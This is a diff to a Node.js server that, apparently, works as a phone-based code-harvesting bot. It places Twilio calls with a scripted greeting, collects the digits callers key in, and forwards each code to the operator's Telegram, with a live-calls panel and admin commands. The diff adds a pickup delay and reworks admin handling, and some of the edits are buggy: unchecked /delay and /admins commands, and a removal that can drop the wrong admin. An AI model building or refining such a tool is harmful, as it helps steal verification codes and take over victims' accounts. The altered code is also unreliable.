@@ -1,12 +1,32 @@
+require("dotenv").config();
+
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
-const fetch = require("node-fetch");
+const axios = require("axios");
 const twilio = require("twilio");
 
+const helmet = require("helmet");
+const compression = require("compression");
+const rateLimit = require("express-rate-limit");
+const pino = require("pino");
+
+const logger = pino();
+
 const app = express();
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+app.use(helmet());
+app.use(compression());
+
+app.use(
+  rateLimit({
+    windowMs: 60 * 1000,
+    max: 120
+  })
+);
 
 const PORT = process.env.PORT || 3000;
 
@@ -62,7 +82,8 @@ const defaultSettings = {
   paused: false,
   readback: false,
   randomAssistant: false,
-  panelTitle: "📞 LIVE CALLS"
+  panelTitle: "📞 LIVE CALLS",
+  answerDelay: 2
 };
 
 function defaultUserState() {
@@ -94,8 +115,7 @@ function defaultDB() {
       scheduledCalls: 0,
       completedCalls: 0
     },
-    users: {},
-    adminIds: []
+    users: {}
   };
 }
 
@@ -135,13 +155,11 @@ function loadDB() {
         ...defaultDB().stats,
         ...(parsed.stats || {})
       },
-      users: parsed.users || {},
-      adminIds: Array.isArray(parsed.adminIds) ? parsed.adminIds.map((x) => String(x)) : []
+      users: parsed.users || {}
     };
 
     if (OWNER_ID) ensureUser(OWNER_ID);
     for (const adminId of ADMIN_IDS) ensureUser(adminId);
-    for (const adminId of db.adminIds || []) ensureUser(adminId);
   } catch (e) {
     console.log("loadDB error:", e.message);
     db = defaultDB();
@@ -149,32 +167,12 @@ function loadDB() {
   }
 }
 
-let saveTimer = null;
-let saveInFlight = false;
-let saveQueued = false;
-
-function flushDBSave() {
-  if (saveInFlight) {
-    saveQueued = true;
-    return;
-  }
-
-  saveInFlight = true;
-  fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), (err) => {
-    saveInFlight = false;
-    if (err) {
-      console.log("saveDB error:", err.message);
-    }
-    if (saveQueued) {
-      saveQueued = false;
-      flushDBSave();
-    }
-  });
-}
-
 function saveDB() {
-  clearTimeout(saveTimer);
-  saveTimer = setTimeout(flushDBSave, 100);
+  try {
+    fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), ()=>{});
+  } catch (e) {
+    console.log("saveDB error:", e.message);
+  }
 }
 
 loadDB();
@@ -212,7 +210,6 @@ function getRole(chatId) {
   if (!id) return "blocked";
   if (id === OWNER_ID) return "owner";
   if (ADMIN_IDS.includes(id)) return "admin";
-  if ((db.adminIds || []).includes(id)) return "admin";
   return "blocked";
 }
 
@@ -279,6 +276,7 @@ function markUserDirty(chatId) {
   if (!chatId) return;
   const user = ensureUser(chatId);
   user.dirty = true;
+  saveDB();
 }
 
 function assistant() {
@@ -415,22 +413,13 @@ function parseDelay(text) {
 
 async function tg(method, data) {
   try {
-    const res = await fetch(
+    const res = await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      }
+      data
     );
-
-    const json = await res.json().catch(() => null);
-    if (!res.ok || !json || json.ok === false) {
-      console.log("tg error:", method, json?.description || res.statusText);
-    }
-    return json;
-  } catch (e) {
-    console.log("tg network error:", method, e.message);
+    return res.data;
+  } catch (err) {
+    logger.error("Telegram API error: " + err.message);
     return null;
   }
 }
@@ -709,6 +698,7 @@ function buildInputTwiml(call) {
 
   return `
 <Response>
+<Pause length="${settings.answerDelay}"/>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
 <Say voice="${voice}">
 ${greeting}
@@ -871,7 +861,7 @@ app.get("/health", (req, res) => {
   res.json({
     status: "ok",
     time: Date.now(),
-    activeCalls: Array.from(calls.values()).filter((c) => c.status !== "Ended").length,
+    activeCalls: sortedCallsForUser(OWNER_ID).length,
     paused: settings.paused
   });
 });
@@ -993,11 +983,7 @@ app.post("/input", async (req, res) => {
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
     pushCodeEntry(caller, digits, sid, ownerId);
 
-    try {
-      await tgSend(ownerId, `${digits}`);
-    } catch (e) {
-      console.log("code send error:", e.message);
-    }
+    try { await tgSend(ownerId, `${digits}`); } catch(e){ console.log('code send fail',e.message);}
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
@@ -1034,11 +1020,6 @@ app.post("/hold", (req, res) => {
 app.post("/telegram", async (req, res) => {
   try {
     const update = req.body || {};
-
-    if (!update.message && !update.callback_query) {
-      return res.sendStatus(200);
-    }
-
     const chatId = String(getChatId(update));
     const role = getRole(chatId);
     const user = ensureUser(chatId);
@@ -1237,56 +1218,56 @@ app.post("/telegram", async (req, res) => {
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
+// set delay command
+if (text.startsWith("/delay")) {
+  const n=parseInt(text.split(" ")[1],10);
+  if(isNaN(n) || n<0 || n>10){
+    await tgSend(chatId,"Usage: /delay 0-10");
+    return res.sendStatus(200);
+  }
+  settings.answerDelay=n;
+  saveSettings();
+  await tgSend(chatId,`Delay set to ${n}s`);
+  return res.sendStatus(200);
+}
+
+// add admin
 if (text.startsWith("/addadmin")) {
   if (!ownerOnly(chatId)) {
-    await tgSend(chatId, "Owner only");
+    await tgSend(chatId,"Owner only");
     return res.sendStatus(200);
   }
-
-  const newAdminId = String((text.split(" ")[1] || "").trim());
-  if (!newAdminId) {
-    await tgSend(chatId, "Usage: /addadmin TELEGRAM_ID");
+  const id=text.split(" ")[1];
+  if(!id){
+    await tgSend(chatId,"Usage: /addadmin TELEGRAM_ID");
     return res.sendStatus(200);
   }
-
-  if (!db.adminIds.includes(newAdminId) && newAdminId !== OWNER_ID) {
-    db.adminIds.push(newAdminId);
-    ensureUser(newAdminId);
-    saveDB();
+  if(!ADMIN_IDS.includes(id)){
+    ADMIN_IDS.push(id);
+    ensureUser(id);
   }
-
-  await tgSend(chatId, `🛡 Admin added: ${newAdminId}`);
+  await tgSend(chatId,`Admin added: ${id}`);
   return res.sendStatus(200);
 }
 
+// remove admin
 if (text.startsWith("/removeadmin")) {
   if (!ownerOnly(chatId)) {
-    await tgSend(chatId, "Owner only");
+    await tgSend(chatId,"Owner only");
     return res.sendStatus(200);
   }
-
-  const removeId = String((text.split(" ")[1] || "").trim());
-  if (!removeId) {
-    await tgSend(chatId, "Usage: /removeadmin TELEGRAM_ID");
-    return res.sendStatus(200);
-  }
-
-  db.adminIds = (db.adminIds || []).filter((id) => String(id) !== removeId);
-  saveDB();
-  await tgSend(chatId, `🗑 Admin removed: ${removeId}`);
+  const id=text.split(" ")[1];
+  ADMIN_IDS.splice(ADMIN_IDS.indexOf(id),1);
+  await tgSend(chatId,`Admin removed: ${id}`);
   return res.sendStatus(200);
 }
 
+// list admins
 if (text === "/admins") {
-  if (!ownerOnly(chatId)) {
-    await tgSend(chatId, "Owner only");
-    return res.sendStatus(200);
-  }
-
-  const list = Array.from(new Set([...(db.adminIds || []), ...ADMIN_IDS]));
-  await tgSend(chatId, list.length ? `🛡 Admins\n\n${list.join("\n")}` : "No admins");
+  await tgSend(chatId,"Admins:\n"+ADMIN_IDS.join("\n"));
   return res.sendStatus(200);
 }
+
 
 
       if (user.pendingInput === "call" && !text.startsWith("/")) {
@@ -1339,7 +1320,7 @@ if (text === "/admins") {
 /export
 /pause
 /resume
-/stop\n/addadmin ID\n/removeadmin ID\n/admins`;
+/stop`;
         }
 
         await tgSend(chatId, commands);
@@ -1738,6 +1719,7 @@ setInterval(async () => {
       }
     }
     cleanupEndedCalls();
+    saveDB();
   } catch {}
 }, 2000);
 
@@ -1752,7 +1734,6 @@ app.listen(PORT, async () => {
   try {
     if (OWNER_ID) {
       ensureUser(OWNER_ID);
-      for (const adminId of db.adminIds || []) ensureUser(adminId);
       await new Promise((r) => setTimeout(r, 2000));
       await updatePanel(OWNER_ID, true);
       console.log("Owner Telegram panel created");
